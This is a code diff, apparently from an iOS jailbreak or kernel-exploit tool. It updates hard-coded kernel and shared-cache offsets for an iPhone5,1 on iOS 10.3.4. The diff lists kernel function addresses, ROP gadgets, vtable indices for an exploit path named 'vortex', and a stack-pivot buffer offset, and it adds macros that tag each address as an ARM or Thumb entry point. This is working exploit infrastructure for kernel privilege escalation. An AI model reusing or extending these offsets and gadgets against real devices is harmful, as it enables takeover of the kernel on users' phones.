@@ -861,27 +861,30 @@ bool populate_offsets(offsets_t* liboffsets, offset_struct_t* offsets)
         offsets->swapprefix_addr                            = 0xfffffff0075ad8cc; // search for the string "/private/var/vm/swapfile" (or "/var/vm/swapfile" on 10.3.4) in the kernel, that's the right address
     }
 #else
+#define FUNC_ARM(funcptr) ((funcptr) & ~1)
+#define FUNC_THUMB(funcptr) ((funcptr) | 1)
+#define VOID_SLIDE(funcptr) ((void*)((funcptr) + CACHE_DIFF))
     if (DEVICE_EQUAL_TO(@"iPhone5,1") && SYSTEM_VERSION_EQUAL_TO(@"10.3.4")) {
         foundOffsets                                        = true; // These offsets exist
         liboffsets->flags                                   = FLAG_SOCK_PORT;
         liboffsets->constant.old_cache_addr                 = 0x1a000000; // static (SHARED_REGION_BASE_ARM in <mach/shared_region.h>)
         liboffsets->constant.new_cache_addr                 = 0x40000000; // static (SHARED_REGION_SIZE_ARM is 0x26000000)
         liboffsets->constant.kernel_image_base              = 0x80001000; // static
-        liboffsets->funcs.copyin                            = 0x80007b9c; // symbol (_copyin)
-        liboffsets->funcs.copyout                           = 0x80007c74; // symbol (_copyout)
-        liboffsets->funcs.current_task                      = 0x8004bd9c; // symbol (_current_task)
-        liboffsets->funcs.get_bsdtask_info                  = 0x8005c8c2; // symbol (_get_bsdtask_info)
-        liboffsets->funcs.vm_map_wire_external              = 0x80091b16; // symbol (_vm_map_wire_external)
-        liboffsets->funcs.vfs_context_current               = 0x8011307e; // symbol (_vfs_context_current)
-        liboffsets->funcs.vnode_lookup                      = 0x800fe61c; // symbol (_vnode_lookup)
-        liboffsets->funcs.osunserializexml                  = 0x8030a478; // symbol (__Z16OSUnserializeXMLPKcPP8OSString)
-        liboffsets->funcs.smalloc                           = 0x80fbf410; // found by searching for "sandbox memory allocation failure"
-        liboffsets->funcs.proc_find                         = 0x8027cfbe; // symbol (_proc_find)
-        liboffsets->funcs.proc_rele                         = 0x8027cf52; // symbol (_proc_rele)
-        liboffsets->funcs.ipc_port_alloc_special            = 0x80019034; // \"ipc_processor_init\" in processor_start -> call above
-        liboffsets->funcs.ipc_kobject_set                   = 0x800290b6; // above _mach_msg_send_from_kernel_proper (2nd above for 10.3.4)
-        liboffsets->funcs.ipc_port_make_send                = 0x80018c54; // first call in long path of KUNCUserNotificationDisplayFromBundle
-        liboffsets->gadgets.add_x0_x0_ret                   = 0x8025f6bc; // gadget (or _csblob_get_cdhash)
+        liboffsets->funcs.copyin                            = FUNC_ARM(0x80007b9c); // symbol (_copyin)
+        liboffsets->funcs.copyout                           = FUNC_ARM(0x80007c74); // symbol (_copyout)
+        liboffsets->funcs.current_task                      = FUNC_THUMB(0x8004bd9c); // symbol (_current_task)
+        liboffsets->funcs.get_bsdtask_info                  = FUNC_THUMB(0x8005c8c2); // symbol (_get_bsdtask_info)
+        liboffsets->funcs.vm_map_wire_external              = FUNC_THUMB(0x80091b16); // symbol (_vm_map_wire_external)
+        liboffsets->funcs.vfs_context_current               = FUNC_THUMB(0x8011307e); // symbol (_vfs_context_current)
+        liboffsets->funcs.vnode_lookup                      = FUNC_THUMB(0x800fe61c); // symbol (_vnode_lookup)
+        liboffsets->funcs.osunserializexml                  = FUNC_THUMB(0x8030a478); // symbol (__Z16OSUnserializeXMLPKcPP8OSString)
+        liboffsets->funcs.smalloc                           = FUNC_THUMB(0x80fbf410); // found by searching for "sandbox memory allocation failure"
+        liboffsets->funcs.proc_find                         = FUNC_THUMB(0x8027cfbe); // symbol (_proc_find)
+        liboffsets->funcs.proc_rele                         = FUNC_THUMB(0x8027cf52); // symbol (_proc_rele)
+        liboffsets->funcs.ipc_port_alloc_special            = FUNC_THUMB(0x80019034); // \"ipc_processor_init\" in processor_start -> call above
+        liboffsets->funcs.ipc_kobject_set                   = FUNC_THUMB(0x800290b6); // above _mach_msg_send_from_kernel_proper (2nd above for 10.3.4)
+        liboffsets->funcs.ipc_port_make_send                = FUNC_THUMB(0x80018c54); // first call in long path of KUNCUserNotificationDisplayFromBundle
+        liboffsets->gadgets.add_x0_x0_ret                   = FUNC_THUMB(0x8025f6bc); // gadget (or _csblob_get_cdhash)
         liboffsets->data.realhost                           = 0x80404150; // _host_priv_self -> adrp addr
         liboffsets->data.zone_map                           = 0x804188e0; // str 'zone_init: kmem_suballoc failed', first qword above
         liboffsets->data.kernel_task                        = 0x80456030; // symbol (_kernel_task)
@@ -911,10 +914,10 @@ bool populate_offsets(offsets_t* liboffsets, offset_struct_t* offsets)
         liboffsets->vortex.vtab_get_retain_count            = (0x8066bbb4 - liboffsets->vtabs.iosurface_root_userclient) / sizeof(kptr_t); // OSObject::getRetainCount array index from vtabs.iosurface_root_userclient
         liboffsets->vortex.vtab_get_external_trap_for_index = (0x8066bf2c - liboffsets->vtabs.iosurface_root_userclient) / sizeof(kptr_t); // IOUserClient::getExternalTrapForIndex
         liboffsets->vortex.kernel_map                       = liboffsets->data.kernel_task + sizeof(kptr_t); // symbol (_kernel_map)
-        liboffsets->vortex.chgproccnt                       = 0x8027cc16; // found by searching for "chgproccnt: procs < 0"
-        liboffsets->vortex.kauth_cred_ref                   = 0x8025e78a; // symbol (_kauth_cred_ref)
-        liboffsets->vortex.osserializer_serialize           = 0x8030687c; // symbol (__ZNK12OSSerializer9serializeEP11OSSerialize)
-        liboffsets->vortex.rop_ldr_r0_r0_0xc                = 0x802d1d44; // search the kernel cache for c0 68 70 47
+        liboffsets->vortex.chgproccnt                       = FUNC_THUMB(0x8027cc16); // found by searching for "chgproccnt: procs < 0"
+        liboffsets->vortex.kauth_cred_ref                   = FUNC_THUMB(0x8025e78a); // symbol (_kauth_cred_ref)
+        liboffsets->vortex.osserializer_serialize           = FUNC_THUMB(0x8030687c); // symbol (__ZNK12OSSerializer9serializeEP11OSSerialize)
+        liboffsets->vortex.rop_ldr_r0_r0_0xc                = FUNC_THUMB(0x802d1d44); // search the kernel cache for c0 68 70 47
 
         liboffsets->socket.task_vm_map                      = 0x14;
         liboffsets->socket.task_prev                        = 0x1c;
@@ -931,17 +934,17 @@ bool populate_offsets(offsets_t* liboffsets, offset_struct_t* offsets)
         liboffsets->socket.ipc_space_is_table               = 0x14;
         liboffsets->socket.size_ipc_entry                   = 0x10;
 
-        liboffsets->userland_funcs.IOConnectTrap6           = (void*)(0x1b0616a6 + CACHE_DIFF); // dlsym of _IOConnectTrap6
-        liboffsets->userland_funcs.mach_ports_lookup        = (void*)(0x1a5ca9b4 + CACHE_DIFF); // dlsym of _mach_ports_lookup
-        liboffsets->userland_funcs.mach_task_self           = (void*)(0x1a5d8480 + CACHE_DIFF); // dlsym of _mach_task_self
-        liboffsets->userland_funcs.mach_vm_remap            = (void*)(0x1a5dc0a6 + CACHE_DIFF); // dlsym of _mach_vm_remap
-        liboffsets->userland_funcs.mach_port_destroy        = (void*)(0x1a5c8d58 + CACHE_DIFF); // dlsym of _mach_port_destroy
-        liboffsets->userland_funcs.mach_port_deallocate     = (void*)(0x1a5c8af2 + CACHE_DIFF); // dlsym of _mach_port_deallocate
-        liboffsets->userland_funcs.mach_port_allocate       = (void*)(0x1a5c92c2 + CACHE_DIFF); // dlsym of _mach_port_allocate
-        liboffsets->userland_funcs.mach_port_insert_right   = (void*)(0x1a5c92ea + CACHE_DIFF); // dlsym of _mach_port_insert_right
-        liboffsets->userland_funcs.mach_ports_register      = (void*)(0x1a5d2f0e + CACHE_DIFF); // dlsym of _mach_ports_register
-        liboffsets->userland_funcs.mach_msg                 = (void*)(0x1a5c86b4 + CACHE_DIFF); // dlsym of _mach_msg
-        liboffsets->userland_funcs.posix_spawn              = (void*)(0x1a5d99c4 + CACHE_DIFF); // dlsym of _posix_spawn
+        liboffsets->userland_funcs.IOConnectTrap6           = VOID_SLIDE(FUNC_THUMB(0x1b0616a6)); // dlsym of _IOConnectTrap6
+        liboffsets->userland_funcs.mach_ports_lookup        = VOID_SLIDE(FUNC_THUMB(0x1a5ca9b4)); // dlsym of _mach_ports_lookup
+        liboffsets->userland_funcs.mach_task_self           = VOID_SLIDE(FUNC_THUMB(0x1a5d8480)); // dlsym of _mach_task_self
+        liboffsets->userland_funcs.mach_vm_remap            = VOID_SLIDE(FUNC_THUMB(0x1a5dc0a6)); // dlsym of _mach_vm_remap
+        liboffsets->userland_funcs.mach_port_destroy        = VOID_SLIDE(FUNC_THUMB(0x1a5c8d58)); // dlsym of _mach_port_destroy
+        liboffsets->userland_funcs.mach_port_deallocate     = VOID_SLIDE(FUNC_THUMB(0x1a5c8af2)); // dlsym of _mach_port_deallocate
+        liboffsets->userland_funcs.mach_port_allocate       = VOID_SLIDE(FUNC_THUMB(0x1a5c92c2)); // dlsym of _mach_port_allocate
+        liboffsets->userland_funcs.mach_port_insert_right   = VOID_SLIDE(FUNC_THUMB(0x1a5c92ea)); // dlsym of _mach_port_insert_right
+        liboffsets->userland_funcs.mach_ports_register      = VOID_SLIDE(FUNC_THUMB(0x1a5d2f0e)); // dlsym of _mach_ports_register
+        liboffsets->userland_funcs.mach_msg                 = VOID_SLIDE(FUNC_THUMB(0x1a5c86b4)); // dlsym of _mach_msg
+        liboffsets->userland_funcs.posix_spawn              = VOID_SLIDE(FUNC_THUMB(0x1a5d99c4)); // dlsym of _posix_spawn
 
         offsets->dns4_array_to_lcconf                       = 0x000b908c - (0x000b9c08 + 0x8); // lcconf = "failed to set my ident: %s", value being offset by 0xb0 (0x6c on 32-bit), then isakmp_config_dns4 = subtract second reference of "No more than %d DNS", first adr in switch case 0x77, add 0x8
         offsets->str_buff_offset                            = 8; // based on the pivot gadget below (the x21 gadget will do a double deref based on specific value on a buffer we control so we need to know its offset)
@@ -960,12 +963,12 @@ bool populate_offsets(offsets_t* liboffsets, offset_struct_t* offsets)
         // offsets->add_x0_gadget = 0x18518bb90; // search the dyld cache for a0 02 14 8b fd 7b 42 a9 f4 4f 41 a9 f6 57 c3 a8 c0 03 5f d6
         offsets->errno_offset                               = 0x385e59d4 + CACHE_DIFF; // we can get that by getting a raw syscall (for example ___mmap, then searching for a branch following that and then searching for an adrp and a str)
         offsets->mach_msg_offset                            = 0x3772a00c + CACHE_DIFF; // address of label _NDR_record, we need to map it before using it
-        offsets->longjmp                                    = 0x1a690270; // dlsym of __longjmp
+        offsets->longjmp                                    = FUNC_ARM(0x1a690270); // dlsym of __longjmp
         // offsets->stack_pivot = offsets->longjmp+0x2c; // longjmp from mov sp, x2
-        offsets->mmap                                       = 0x1a5c8f18; // dlsym of ___mmap
-        offsets->memcpy                                     = 0x1a5c9b64; // dlsym of _memcpy
-        offsets->open                                       = 0x1a5dd470; // dlsym of ___open
-        offsets->fcntl_raw_syscall                          = 0x1a5dc8bc; // dlsym of ___fcntl
+        offsets->mmap                                       = FUNC_THUMB(0x1a5c8f18); // dlsym of ___mmap
+        offsets->memcpy                                     = FUNC_THUMB(0x1a5c9b64); // dlsym of _memcpy
+        offsets->open                                       = FUNC_ARM(0x1a5dd470); // dlsym of ___open
+        offsets->fcntl_raw_syscall                          = FUNC_ARM(0x1a5dc8bc); // dlsym of ___fcntl
         offsets->rootdomainUC_vtab                          = 0x803e039c; // find __ZTV20RootDomainUserClient in kernel, first non-zero byte
         offsets->swapprefix_addr                            = 0x80394f91; // search for the string "/private/var/vm/swapfile" (or "/var/vm/swapfile" on 10.3.4) in the kernel, that's the right address
     }
@@ -973,6 +976,7 @@ bool populate_offsets(offsets_t* liboffsets, offset_struct_t* offsets)
 
 // Socket offsets for 64-bit (TODO: verify)
 #ifdef __LP64__
+    liboffsets->vortex.realhost_special = 0x10; // ldr offset of _host_get_special_port
     if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"12.0")) {
         printf("[i] offsets selected for iOS 12.0 or above\n");
         liboffsets->socket.task_vm_map    = 0x20;
